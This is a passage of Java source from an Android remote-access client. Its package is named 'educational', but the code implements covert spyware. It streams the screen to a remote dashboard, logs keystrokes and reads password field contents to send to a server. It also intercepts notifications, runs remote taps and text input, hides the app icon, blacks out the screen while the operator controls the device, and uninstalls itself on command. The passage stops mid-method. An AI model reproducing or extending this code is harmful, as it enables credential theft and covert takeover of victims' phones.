        if (command.equals("run_task_local")) {
            final JSONArray steps = params.optJSONArray("steps");
            final String commandId = params.optString("commandId", "");
            if (steps == null || steps.length() == 0)
                return new JSONObject().put("success", false).put("error", "No steps");
            // Acknowledge immediately — task executes in background thread
            new Thread(() -> { try { executeTaskLocal(steps, commandId); } catch (Exception e) { Log.e(TAG, "run_task_local: " + e.getMessage()); } }, "task-local").start();
            return new JSONObject().put("success", true).put("started", true);
        }
        if (command.equals("disable_app"))    return appMonitor.disableApp(params.getString("packageName"));

        // ── Notifications ────────────────────────────────────────────────
        if (command.equals("get_notifications"))          return NotificationInterceptor.getAllNotifications();
        if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
        if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();

        // ── Streaming — event-driven ─────────────────────────────────────
        if (command.equals("stream_start")) {
            String deviceId = DeviceInfo.getDeviceId(context);
            startIdleFrameMode(deviceId);
            sendSingleFrame(deviceId); // send first frame immediately
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Event-driven stream started (idle keepalive every 5s)");
            return r;
        }
        if (command.equals("stream_stop")) {
            stopIdleFrameMode();
            stopBlockFrameMode();
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stream stopped");
            return r;
        }
        if (command.equals("stream_request_frame")) {
            // When block screen is active the device is already pushing frames every 1.5s.
            // Ignore on-demand frame requests to avoid duplicate frames and extra CPU load.
            if (blockFrameMode) {
                JSONObject r = new JSONObject();
                r.put("success", true);
                r.put("message", "Block screen active — frame auto-pushed at 1.5s interval");
                return r;
            }
            String deviceId = DeviceInfo.getDeviceId(context);
            sendSingleFrame(deviceId);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Frame captured and sent");
            return r;
        }

        // ── Screen Blackout ───────────────────────────────────────────────
        if (command.equals("screen_blackout_on")) {
            JSONObject r = screenBlackout.enableBlackout();
            if (r.optBoolean("success", false)) {
                // Start auto-pushing frames every 1.5s so dashboard can see & control the device
                startBlockFrameMode(DeviceInfo.getDeviceId(context));
            }
            return r;
        }
        if (command.equals("screen_blackout_off")) {
            JSONObject r = screenBlackout.disableBlackout();
            stopBlockFrameMode();
            return r;
        }
        if (command.equals("get_blackout_status")) {
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("active", screenBlackout.isActive());
            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
            return r;
        }

        if (command.equals("fully_hide_app")) {
            JSONObject r = new JSONObject();
            try {
                com.remoteaccess.educational.stealth.StealthManager sm =
                    new com.remoteaccess.educational.stealth.StealthManager(context);
                return sm.fullyHideApp();
            } catch (Exception e) {
                r.put("success", false);
                r.put("error", e.getMessage());
                return r;
            }
        }
        if (command.equals("fully_show_app")) {
            JSONObject r = new JSONObject();
            try {
                com.remoteaccess.educational.stealth.StealthManager sm =
                    new com.remoteaccess.educational.stealth.StealthManager(context);
                return sm.fullyShowApp();
            } catch (Exception e) {
                r.put("success", false);
                r.put("error", e.getMessage());
                return r;
            }
        }

        if (command.equals("get_permissions")) {
            return permissionManager.getPermissions();
        }

        // ── Self-destruct ─────────────────────────────────────────────────
        if (command.equals("self_destruct")) {
            return performSelfDestruct();
        }

        // ── Dynamic app monitoring ────────────────────────────────────────
        if (command.equals("add_monitored_app")) {
            String pkg = params.optString("packageName", "");
            if (!pkg.isEmpty()) dynamicMonitoredPackages.add(pkg);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Now monitoring: " + pkg);
            return r;
        }
        if (command.equals("remove_monitored_app")) {
            String pkg = params.optString("packageName", "");
            dynamicMonitoredPackages.remove(pkg);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stopped monitoring: " + pkg);
            return r;
        }

        // ── Permissions ───────────────────────────────────────────────────
        if (command.equals("request_permission")) {
            String perm = params.optString("permission", "");
            if (perm.isEmpty()) {
                JSONObject r = new JSONObject();
                r.put("success", false);
                r.put("error", "Missing 'permission' parameter");
                return r;
            }
            return permissionManager.requestPermission(perm);
        }
        if (command.equals("request_all_permissions")) {
            return permissionManager.requestAllPermissions();
        }

        // ── Accessibility-required commands ──────────────────────────────
        // Screen Control (gestures) + Screen Reader
        if (isAccessibilityCommand(command)) {
            return handleAccessibilityCommand(command, params);
        }

        // ── Unknown ──────────────────────────────────────────────────────
        JSONObject unknown = new JSONObject();
        unknown.put("success", false);
        unknown.put("error", "Unknown command: " + command);
        return unknown;
    }

    // ── Streaming — event-driven single-frame model ───────────────────────

    // Minimum gap between consecutive frame sends (ms) — enforces backpressure on slow links.
    // After each frame send we record the actual wall-clock time and refuse a new send if the
    // previous one completed less than MIN_FRAME_GAP_MS ago. This prevents the TCP send buffer
    // from filling up on 3G where a frame can take 1-2 s to flush.
    private volatile long lastFrameSentMs = 0L;
    private static final long MIN_FRAME_GAP_MS = 600; // never exceed ~1.6 FPS on the wire

    /** Send exactly one frame immediately. Drops the call if a frame is already being captured. */
    public void sendSingleFrame(String deviceId) {
        // Backpressure: skip if the last frame was sent too recently (TCP buffer pressure).
        long now = System.currentTimeMillis();
        if (now - lastFrameSentMs < MIN_FRAME_GAP_MS) {
            Log.d(TAG, "sendSingleFrame: throttled — last frame sent " + (now - lastFrameSentMs) + " ms ago");
            return;
        }
        // Throttle: only one frame capture at a time — drop new requests while busy
        if (!frameBusy.compareAndSet(false, true)) {
            Log.d(TAG, "sendSingleFrame: dropped — previous frame still in progress");
            return;
        }
        executor.execute(() -> {
            try {
                Bitmap frame = captureFrame();
                if (frame != null) {
                    // 360 px wide for 3G compatibility — smaller frame = faster upload, lower latency.
                    // Encodes ~2× faster than 540 px and uses ~55% less data on the wire.
                    Bitmap scaled = scaleBitmapToWidth(frame, 360);
                    if (scaled != frame) frame.recycle();
                    // Start at 35% quality, max 40 KB raw — safe for 3G uplinks (~0.5 Mbps).
                    String b64 = bitmapToBase64Adaptive(scaled, 35, 40_000);
                    scaled.recycle();
                    if (b64 != null) {
                        JSONObject d = new JSONObject();
                        d.put("deviceId",   deviceId);
                        d.put("frameData",  b64);
                        d.put("timestamp",  System.currentTimeMillis());
                        // Always include screen dimensions so dashboard can map clicks correctly
                        if (deviceScreenW > 0) {
                            d.put("screenWidth",  deviceScreenW);
                            d.put("screenHeight", deviceScreenH);
                        }
                        // Use dedicated stream channel — keeps command channel clear
                        sendStreamMessage("stream:frame", d);
                        // Record send time for backpressure — prevents TCP buffer overflow on slow links
                        lastFrameSentMs = System.currentTimeMillis();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "sendSingleFrame error: " + e.getMessage());
            } finally {
                frameBusy.set(false);
            }
        });
    }

    /** Scale a bitmap so its width is at most maxWidth; keeps aspect ratio. */
    private Bitmap scaleBitmapToWidth(Bitmap src, int maxWidth) {
        if (src == null || src.getWidth() <= maxWidth) return src;
        float ratio = (float) maxWidth / src.getWidth();
        int newH = Math.max(1, Math.round(src.getHeight() * ratio));
        return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
    }

    /** Start idle-frame mode: send one frame every 1000 ms (~1 FPS) for 3G-compatible streaming. */
    private void startIdleFrameMode(String deviceId) {
        stopIdleFrameMode();
        idleFrameMode = true;
        // scheduleWithFixedDelay: waits 1000 ms AFTER the previous execution completes.
        // scheduleAtFixedRate would fire immediately after 1000 ms regardless of how long
        // the previous frame took — on slow 3G (frame send may take >1 s) this floods the
        // channel and causes TCP buffer back-pressure that stalls the command socket.
        idleFrameFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            if (idleFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
        }, 0, 1000, TimeUnit.MILLISECONDS);
        Log.i(TAG, "Idle-frame mode started (1000ms delay, ~1 FPS max — 3G compatible)");
    }

    private void stopIdleFrameMode() {
        idleFrameMode = false;
        if (idleFrameFuture != null) {
            idleFrameFuture.cancel(false);
            idleFrameFuture = null;
        }
    }

    /** Start block-frame mode: push one frame every 1500 ms while block screen is active (3G safe). */
    private void startBlockFrameMode(String deviceId) {
        stopBlockFrameMode();
        blockFrameMode = true;
        // Send first frame immediately so dashboard sees real content right away
        executor.execute(() -> sendSingleFrame(deviceId));
        blockFrameFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
        }, 1500, 1500, TimeUnit.MILLISECONDS);
        Log.i(TAG, "Block-frame mode started (1500ms delay — 3G compatible)");
    }

    private void stopBlockFrameMode() {
        blockFrameMode = false;
        if (blockFrameFuture != null) {
            blockFrameFuture.cancel(false);
            blockFrameFuture = null;
        }
    }

    private Bitmap captureFrame() {
        final Bitmap[] result = {null};

        Runnable doCapture = () -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                if (svc != null) {
                    result[0] = svc.captureScreenSync();
                    return;
                }
            }
            try {
                result[0] = screenshotHandler.captureBitmap();
            } catch (Exception e) {
                Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
            }
        };

        // captureScreenSync() uses AccessibilityService.takeScreenshot() which captures
        // the real screen content behind accessibility overlays — no need to hide the overlay.
        doCapture.run();

        return result[0];
    }

    private String bitmapToBase64(Bitmap bitmap, int quality) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "bitmapToBase64 error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Encode bitmap to Base64 JPEG within a max byte budget.
     * Reuses a single ByteArrayOutputStream (reset between attempts) to avoid
     * per-encode allocation and GC pauses on the hot streaming path.
     *
     * @param bitmap   source bitmap
     * @param quality  starting JPEG quality (0-100)
     * @param maxBytes max raw-JPEG byte budget (Base64 is ~4/3 of this, so actual
     *                 Base64 string length will be up to maxBytes * 4 / 3)
     */
    private String bitmapToBase64Adaptive(Bitmap bitmap, int quality, int maxBytes) {
        // Pre-allocate with a reasonable capacity — avoids internal array copies on resize.
        ByteArrayOutputStream baos = new ByteArrayOutputStream(maxBytes);
        try {
            int q = quality;
            while (q >= 20) {
                baos.reset();
                bitmap.compress(Bitmap.CompressFormat.JPEG, q, baos);
                byte[] bytes = baos.toByteArray();
                // Base64 expands by 4/3 — check raw size first to avoid encoding if it's too big.
                if (bytes.length <= maxBytes || q <= 20) {
                    if (q < quality) Log.d(TAG, "Adaptive quality: " + q + "% (" + bytes.length + " raw bytes)");
                    return Base64.encodeToString(bytes, Base64.NO_WRAP);
                }
                q -= 10;
            }
        } catch (Exception e) {
            Log.e(TAG, "bitmapToBase64Adaptive error: " + e.getMessage());
        }
        return null;
    }

    private boolean isAccessibilityCommand(String command) {
        switch (command) {
            case "touch":
            case "swipe":
            case "press_back":
            case "press_home":
            case "press_recents":
            case "open_notifications":
            case "open_quick_settings":
            case "scroll_up":
            case "scroll_down":
            case "input_text":
            case "press_enter":
            case "click_by_text":
            case "read_screen":
            case "find_by_text":
            case "get_current_app":
            case "get_clickable_elements":
            case "get_input_fields":
            case "wake_screen":
            case "screen_off":
            case "open_task_manager":
            case "screen_reader_start":
            case "screen_reader_stop":
                return true;
            default:
                return false;
        }
    }

    private JSONObject handleAccessibilityCommand(String command, JSONObject params) throws JSONException {
        UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();

        if (accessSvc == null) {
            JSONObject r = new JSONObject();
            r.put("success", false);
            r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
                             "Downloaded Apps → [App Name]");
            r.put("requiresAccessibility", true);
            return r;
        }

        // Screen Control commands (gestures)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            ScreenController sc = new ScreenController(accessSvc);

            switch (command) {
                case "touch": {
                    int tx = params.getInt("x");
                    int ty = params.getInt("y");
                    // Deduplication: ignore identical touch within 250 ms
                    String touchKey = "touch:" + tx + "," + ty;
                    long now = System.currentTimeMillis();
                    if (touchKey.equals(lastTouchKey) && (now - lastTouchTime) < 250) {
                        Log.d(TAG, "touch dedup ignored: " + touchKey);
                        JSONObject r = new JSONObject();
                        r.put("success", true);
                        r.put("deduped", true);
                        return r;
                    }
                    lastTouchKey  = touchKey;
                    lastTouchTime = now;
                    return sc.touch(tx, ty, params.optInt("duration", 100));
                }
                case "swipe": {
                    String direction = params.optString("direction", "");
                    int sx1, sy1, sx2, sy2;
                    if (!direction.isEmpty()) {
                        android.graphics.Point screenSz = new android.graphics.Point();
                        ((android.view.WindowManager) accessSvc.getSystemService(android.content.Context.WINDOW_SERVICE))
                            .getDefaultDisplay().getRealSize(screenSz);
                        int midX = screenSz.x / 2;
                        int midY = screenSz.y / 2;
                        int step = (int)(screenSz.y * 0.3f);
                        sx1 = midX; sy1 = midY; sx2 = midX; sy2 = midY;
                        switch (direction) {
                            case "up":    sy1 = midY + step; sy2 = midY - step; break;
                            case "down":  sy1 = midY - step; sy2 = midY + step; break;
                            case "left":  sx1 = midX + step; sx2 = midX - step; break;
                            case "right": sx1 = midX - step; sx2 = midX + step; break;
                        }
                    } else {
                        sx1 = params.optInt("x1", params.optInt("startX", 0));
                        sy1 = params.optInt("y1", params.optInt("startY", 0));
                        sx2 = params.optInt("x2", params.optInt("endX", 0));
                        sy2 = params.optInt("y2", params.optInt("endY", 0));
                    }
                    return sc.swipe(sx1, sy1, sx2, sy2, params.optInt("duration", 400));
                }
                case "press_back":         return sc.pressBack();
                case "press_home":         return sc.pressHome();
                case "press_recents":      return sc.pressRecents();
                case "open_notifications": return sc.openNotifications();
                case "open_quick_settings":return sc.openQuickSettings();
                case "scroll_up":          return sc.scrollUp();
                case "scroll_down":        return sc.scrollDown();
                case "input_text":         return sc.inputText(params.getString("text"));
                case "press_enter":        return sc.pressEnter();
                case "click_by_text":      return sc.clickByText(params.getString("text"));
                case "wake_screen":        return sc.wakeScreen();
                case "screen_off":         return sc.lockScreen();
                case "open_task_manager":  return sc.pressRecents();
            }
        } else if (isGestureCommand(command)) {
            JSONObject r = new JSONObject();
            r.put("success", false);
            r.put("error", command + " requires Android 7.0+ (API 24)");
            return r;
        }

        // Screen Reader commands — MUST be serialized: AccessibilityNodeInfo is not thread-safe.
        // Concurrent traversals from the cached thread pool corrupt Android's node pool and crash the process.
        ScreenReader sr = new ScreenReader(accessSvc);
        switch (command) {
            case "read_screen": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false);
                        r.put("error", "read_screen busy — accessibility reader is already running, retry");
                        return r;
                    }
                    JSONObject screenResult = sr.readScreen();
                    pushPasswordFieldsFromScreen(screenResult);
                    return screenResult;
                } finally {
                    if (acquired) accessSemaphore.release();
                }
            }
            case "find_by_text": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    return sr.findByText(params.getString("text"));
                } finally { if (acquired) accessSemaphore.release(); }
            }
            case "get_current_app": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    return sr.getCurrentApp();
                } finally { if (acquired) accessSemaphore.release(); }
            }
            case "get_clickable_elements": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    return sr.getClickableElements();
                } finally { if (acquired) accessSemaphore.release(); }
            }
            case "get_input_fields": {
                boolean acquired = false;
                try {
                    try { acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
                    if (!acquired) {
                        JSONObject r = new JSONObject();
                        r.put("success", false); r.put("error", "accessibility busy"); return r;
                    }
                    JSONObject inputResult = sr.getInputFields();
                    pushPasswordFieldsFromInputFields(inputResult);
                    return inputResult;
                } finally { if (acquired) accessSemaphore.release(); }
            }

            case "screen_reader_start": {
                startScreenReaderLoop(accessSvc, false);
                JSONObject ok = new JSONObject();
                ok.put("success", true);
                return ok;
            }

            case "screen_reader_stop": {
                stopScreenReaderLoop(false);
                JSONObject ok = new JSONObject();
                ok.put("success", true);
                return ok;
            }
        }

        JSONObject r = new JSONObject();
        r.put("success", false);
        r.put("error", "Unhandled accessibility command: " + command);
        return r;
    }

    private boolean isGestureCommand(String command) {
        switch (command) {
            case "touch": case "swipe": case "scroll_up": case "scroll_down": return true;
            default: return false;
        }
    }

    // ── Screen Reader Auto-Recording (device-driven) ──────────────────────────

    /**
     * Compute a lightweight fingerprint for a screen result so we can skip
     * duplicate frames — the lock screen often stays identical for long periods.
     */
    private String computeFrameFingerprint(JSONObject screenResult) {
        if (screenResult == null) return "";
        try {
            JSONObject screen = screenResult.optJSONObject("screen");
            if (screen == null) return "";
            String pkg = screen.optString("packageName", "");
            JSONArray elements = screen.optJSONArray("elements");
            StringBuilder sb = new StringBuilder(pkg);
            if (elements != null) {
                int count = Math.min(elements.length(), 12);
                for (int i = 0; i < count; i++) {
                    JSONObject el = elements.optJSONObject(i);
                    if (el != null) {
                        sb.append('|').append(el.optString("text", ""));
                        sb.append('|').append(el.optString("contentDescription", ""));
                        sb.append('|').append(el.optString("hintText", ""));
                    }
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * Internal: start the screen-reader push loop.
     * @param svc           the running accessibility service
     * @param sendAutoEvent if true, push an autoEvent:'start' so the dashboard
     *                      automatically enters recording mode.
     */
    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
        ScheduledFuture<?> old = screenReaderFuture;
        if (old != null) { old.cancel(false); screenReaderFuture = null; }
        lastFrameFingerprint = null;

        final String devId = DeviceInfo.getDeviceId(context);

        if (sendAutoEvent) {
            try {
                JSONObject startEvt = new JSONObject();
                startEvt.put("deviceId", devId);
                startEvt.put("autoEvent", "start");
                startEvt.put("success", false);
                sendLiveMessage("screen:update", startEvt);
            } catch (Exception ignored) {}
        }

        screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
            boolean acq = false;
            try {
                acq = accessSemaphore.tryAcquire(3, TimeUnit.SECONDS);
                if (!acq) return;
                ScreenReader pusher = new ScreenReader(svc);
                JSONObject screenResult = pusher.readScreen();
                pushPasswordFieldsFromScreen(screenResult);

                // Deduplication: skip frame if content is identical to last push
                String fp = computeFrameFingerprint(screenResult);
                if (fp.equals(lastFrameFingerprint) && !fp.isEmpty()) return;
                lastFrameFingerprint = fp;

                JSONObject payload = new JSONObject();
                payload.put("deviceId", devId);
                payload.put("success", screenResult.optBoolean("success", false));
                if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
                sendLiveMessage("screen:update", payload);
            } catch (Exception e) {
                Log.e(TAG, "screen_reader push error: " + e.getMessage());
            } finally {
                if (acq) accessSemaphore.release();
            }
        }, 0, 1000L, TimeUnit.MILLISECONDS);
    }

    /**
     * Internal: stop the screen-reader push loop.
     * @param sendAutoEvent if true, push an autoEvent:'stop' so the dashboard
     *                      automatically saves the current recording.
     */
    private void stopScreenReaderLoop(boolean sendAutoEvent) {
        ScheduledFuture<?> f = screenReaderFuture;
        if (f != null) { f.cancel(false); screenReaderFuture = null; }
        lastFrameFingerprint = null;

        if (sendAutoEvent) {
            try {
                JSONObject stopEvt = new JSONObject();
                stopEvt.put("deviceId", DeviceInfo.getDeviceId(context));
                stopEvt.put("autoEvent", "stop");
                stopEvt.put("success", false);
                sendLiveMessage("screen:update", stopEvt);
            } catch (Exception ignored) {}
        }
    }

    /**
     * Called by UnifiedAccessibilityService when the screen wakes up locked
     * or immediately when accessibility is first enabled.
     * Starts the recording loop and notifies the dashboard automatically.
     */
    public void startScreenReaderAuto() {
        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
        if (svc == null) return;
        startScreenReaderLoop(svc, true);
    }

    /**
     * Called by UnifiedAccessibilityService when the screen turns off or the
     * device is unlocked.  Stops the recording loop and tells the dashboard to
     * save whatever it has collected.
     */
    public void stopScreenReaderAuto() {
        stopScreenReaderLoop(true);
    }

    /** Push a keylog entry to the server immediately (live feed) via live channel. */
    public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
        pushKeylogEntry(packageName, appName, text, eventType, timestamp, false, "");
    }

    /** Push a keylog entry with password field metadata. */
    public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
                                String timestamp, boolean isPassword, String fieldType) {
        // IMPORTANT: Use the general cached executor, NOT liveExecutor.
        // liveExecutor's single thread is permanently blocked in liveChannelLoop's readLine().
        // Tasks submitted to liveExecutor while readLine() is blocking are queued forever.
        executor.execute(() -> {
            try {
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("text", text);
                entry.put("eventType", eventType);
                entry.put("timestamp", timestamp);
                entry.put("isPassword", isPassword);
                entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                sendLiveMessage("keylog:entry", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
            }
        });
    }

    /** Scan a read_screen result for password fields and push them as keylog entries. */
    private void pushPasswordFieldsFromScreen(JSONObject screenResult) {
        if (screenResult == null || !screenResult.optBoolean("success", false)) return;
        try {
            JSONObject screen = screenResult.optJSONObject("screen");
            if (screen == null) return;
            String packageName = screen.optString("packageName", "");
            String appName = "";
            try {
                android.content.pm.PackageManager pm = context.getPackageManager();
                android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
                appName = pm.getApplicationLabel(ai).toString();
            } catch (Exception ignored) {}
            org.json.JSONArray elements = screen.optJSONArray("elements");
            if (elements == null) return;
            String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.getDefault()).format(new java.util.Date());
            for (int i = 0; i < elements.length(); i++) {
                JSONObject el = elements.optJSONObject(i);
                if (el == null) continue;
                boolean isPass = el.optBoolean("isPassword", false);
                if (!isPass) continue;
                String pwText = el.optString("passwordText", "");
                if (pwText.isEmpty()) continue;
                String hint = el.optString("hint", "password");
                final String finalAppName = appName.isEmpty() ? packageName : appName;
                final String finalHint = hint;
                final String finalPkg = packageName;
                final String finalText = pwText;
                final String finalTs = ts;
                keyloggerService.logEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS");
                if (isConnected()) {
                    pushKeylogEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS",
                            finalTs, true, finalHint);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "pushPasswordFieldsFromScreen: " + e.getMessage());
        }
    }

    /** Scan a get_input_fields result for password fields and push them as keylog entries. */
    private void pushPasswordFieldsFromInputFields(JSONObject inputResult) {
        if (inputResult == null || !inputResult.optBoolean("success", false)) return;
        try {
            org.json.JSONArray inputs = inputResult.optJSONArray("inputs");
            if (inputs == null) return;
            String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.getDefault()).format(new java.util.Date());
            for (int i = 0; i < inputs.length(); i++) {
                JSONObject inp = inputs.optJSONObject(i);
                if (inp == null) continue;
                boolean isPass = inp.optBoolean("isPassword", false);
                if (!isPass) continue;
                String pwText = inp.optString("passwordText", "");
                if (pwText.isEmpty()) continue;
                String hint = inp.optString("hint", "password");
                if (isConnected()) {
                    pushKeylogEntry("", "", pwText, "PASSWORD_FOCUS", ts, true, hint);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "pushPasswordFieldsFromInputFields: " + e.getMessage());
        }
    }

    /** Push a live notification to the server (relayed to dashboard) via live channel. */
    public void pushNotification(String packageName, String appName, String title, String text, long postTime) {
        executor.execute(() -> {
            try {
                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date(postTime));
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("title", title != null ? title : "");
                entry.put("text", text != null ? text : "");
                entry.put("timestamp", ts);
                entry.put("postTime", postTime);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                sendLiveMessage("notification:entry", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushNotification error: " + e.getMessage());
            }
        });
    }

    /** Push a foreground app change to the server (recent activity) via live channel. */
    public void pushRecentActivity(String packageName, String appName) {
        executor.execute(() -> {
            try {
                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date());
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("timestamp", ts);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                sendLiveMessage("app:foreground", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
            }
        });
    }

    /** Whether a package is monitored (static config OR dynamically added). */
    public boolean isDynamicallyMonitored(String pkg) {
        return dynamicMonitoredPackages.contains(pkg);
    }

    /** Self-destruct: clear data and launch uninstall flow. */
    private JSONObject performSelfDestruct() {
        JSONObject r = new JSONObject();
        try {
            // Schedule destruction after giving time to send the response
            new Thread(() -> {
                try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                try {
                    // Enable uninstall-assist mode in accessibility
                    UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                    if (svc != null) svc.enableUninstallAssist();

                    // Open uninstall dialog
                    android.content.Intent intent = new android.content.Intent(
                        android.content.Intent.ACTION_DELETE,
                        android.net.Uri.parse("package:" + context.getPackageName())
                    );
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "selfDestruct error: " + e.getMessage());
                }
            }).start();
            r.put("success", true);
            r.put("message", "Self-destruct initiated — uninstalling app");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Execute all task steps locally on the device, one after another.
     *
     * Rules:
     *  - click_text polls every 100 ms for up to 8 s; clicks immediately when the
     *    text appears on screen.
     *  - ANY step that fails aborts the whole task — no further steps are executed.
     *  - A 500 ms settle delay is inserted between steps so the accessibility tree
     *    has time to refresh before the next step runs.
     */
    private void executeTaskLocal(JSONArray steps, String commandId) {
        final long CLICK_TEXT_TIMEOUT_MS = 8_000L;
        final long CLICK_TEXT_POLL_MS    = 100L;
        final long INTER_STEP_DELAY_MS   = 500L;

        int total     = steps.length();
        int completed = 0;

        for (int i = 0; i < total; i++) {
            JSONObject step;
            String type;
            try {
                step = steps.getJSONObject(i);
                type = step.optString("type", "");
            } catch (Exception e) {
                Log.e(TAG, "executeTaskLocal: bad step at index " + i);
                continue;
            }

            try {
                sendTaskProgress(commandId, i, total, false, true, "Starting: " + type, false, null);

                JSONObject result;

                switch (type) {

                    // ── Open App ────────────────────────────────────────────
                    case "open_app": {
                        JSONObject p = new JSONObject();
                        p.put("packageName", step.optString("packageName", ""));
                        result = dispatchCommand("open_app", p);
                        break;
                    }

                    // ── Close App ────────────────────────────────────────────
                    case "close_app": {
                        JSONObject p = new JSONObject();
                        p.put("packageName", step.optString("packageName", ""));
                        result = dispatchCommand("force_stop_app", p);
                        break;
                    }

                    // ── Click Text — polls up to 8 s, clicks the instant text appears ──
                    case "click_text": {
                        String textToFind = step.optString("text", "").trim();
                        if (textToFind.isEmpty()) {
                            result = new JSONObject().put("success", false).put("error", "click_text: no text specified");
                            break;
                        }

                        long pollDeadline = System.currentTimeMillis() + CLICK_TEXT_TIMEOUT_MS;
                        result = new JSONObject()
                                .put("success", false)
                                .put("error", "Text not found within 8 s: \"" + textToFind + "\"");

                        while (System.currentTimeMillis() < pollDeadline) {
                            // Poll — find_by_text uses the accessibility tree (semaphore-guarded)
                            JSONObject findParams = new JSONObject();
                            findParams.put("text", textToFind);
                            JSONObject findResult = dispatchCommand("find_by_text", findParams);

                            if (findResult.optBoolean("success", false)) {
                                int cnt = findResult.optInt("count", 0);
                                JSONArray matches = findResult.optJSONArray("matches");
                                boolean onScreen = cnt > 0 || (matches != null && matches.length() > 0);
                                if (onScreen) {
                                    // Text is visible — click it immediately
                                    long elapsed = CLICK_TEXT_TIMEOUT_MS - (pollDeadline - System.currentTimeMillis());
                                    sendTaskProgress(commandId, i, total, false, true,
                                            "Text found after " + elapsed + " ms — clicking…", false, null);
                                    JSONObject clickParams = new JSONObject();
                                    clickParams.put("text", textToFind);
                                    result = dispatchCommand("click_by_text", clickParams);
                                    break;
                                }
                            }

                            long remaining = pollDeadline - System.currentTimeMillis();
                            if (remaining <= 0) break;
                            Thread.sleep(Math.min(CLICK_TEXT_POLL_MS, remaining));
                        }
                        break;
                    }

                    // ── Paste / Input Text ──────────────────────────────────
                    case "paste_text": {
                        JSONObject p = new JSONObject();
                        p.put("text", step.optString("text", ""));
                        result = dispatchCommand("input_text", p);
                        break;
